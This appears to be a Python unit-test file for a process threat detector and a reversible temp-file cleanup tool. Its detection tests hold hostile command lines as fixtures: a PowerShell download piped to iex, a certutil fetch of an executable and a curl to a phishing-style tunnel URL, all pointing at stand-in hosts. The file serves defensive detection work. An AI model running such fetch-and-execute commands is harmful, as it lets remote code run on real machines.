"""Tests for cross-platform system optimizer and phishing/downloader threat detection."""

from __future__ import annotations

import os
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch

from os_adapter import ProcessSnapshot
from swarm_analyzer import analyze_snapshot
from system_optimizer import (
    analyze_optimizations,
    apply_safe_cleanup,
    collect_health_snapshot,
    restore_cleanup_item,
)


class PhishingAndDownloaderTests(unittest.TestCase):
    def test_detects_windows_powershell_iex_downloader(self):
        snap = ProcessSnapshot(
            pid=5001,
            ppid=1,
            name="powershell.exe",
            cmdline=["powershell.exe", "-c", "Invoke-WebRequest https://evil.test/p.ps1 | iex"],
            exe="powershell.exe",
            cwd="C:\\Users\\test",
            username="test",
        )
        v = analyze_snapshot(snap)
        self.assertEqual(v.verdict, "CRITICAL THREAT")

    def test_detects_windows_certutil_urlcache(self):
        snap = ProcessSnapshot(
            pid=5002,
            ppid=1,
            name="certutil.exe",
            cmdline=["certutil.exe", "-urlcache", "-split", "-f", "https://evil.test/a.exe"],
            exe="certutil.exe",
            cwd="C:\\Users\\test",
            username="test",
        )
        v = analyze_snapshot(snap)
        self.assertEqual(v.verdict, "CRITICAL THREAT")

    def test_detects_phishing_tunnel_url(self):
        snap = ProcessSnapshot(
            pid=5003,
            ppid=1,
            name="curl",
            cmdline=["curl", "https://verify-account.trycloudflare.com/login-verify"],
            exe="/usr/bin/curl",
            cwd="/tmp",
            username="user",
        )
        v = analyze_snapshot(snap)
        self.assertEqual(v.verdict, "CRITICAL THREAT")


class SystemOptimizerTests(unittest.TestCase):
    def test_collect_health_snapshot_shape(self):
        snap = collect_health_snapshot()
        self.assertIn(snap.os_name, {"linux", "darwin", "windows"})
        self.assertGreaterEqual(snap.process_count, 1)
        self.assertGreaterEqual(snap.memory_percent, 0.0)

    def test_safe_cleanup_is_reversible(self):
        snap = collect_health_snapshot()
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            stale = tmp_path / "old_agent_crash.tmp"
            stale.write_text("stale temp bytes", encoding="utf-8")
            old_time = time.time() - (48 * 3600)
            os.utime(stale, (old_time, old_time))

            fresh = tmp_path / "active_session.tmp"
            fresh.write_text("active", encoding="utf-8")

            archive_dir = tmp_path / "archive"
            actions = analyze_optimizations(snap, temp_dirs=[tmp_path], max_age_hours=24.0)
            stale_targets = [a.target_path for a in actions if a.kind == "stale_temp_cleanup"]
            self.assertIn(str(stale), stale_targets)
            self.assertNotIn(str(fresh), stale_targets)

            dry = apply_safe_cleanup(actions, dry_run=True, archive_dir=archive_dir, log_incident=False)
            self.assertEqual(len(dry), 1)
            self.assertTrue(stale.exists())

            with patch("system_optimizer.append_incident"):
                applied = apply_safe_cleanup(actions, dry_run=False, archive_dir=archive_dir, log_incident=True)
            self.assertEqual(len(applied), 1)
            self.assertFalse(stale.exists())
            archived = Path(applied[0]["archived_path"])
            self.assertTrue(archived.exists())

            # Reversibility check
            self.assertTrue(restore_cleanup_item(archived, stale))
            self.assertTrue(stale.exists())
            self.assertFalse(archived.exists())


if __name__ == "__main__":
    unittest.main()
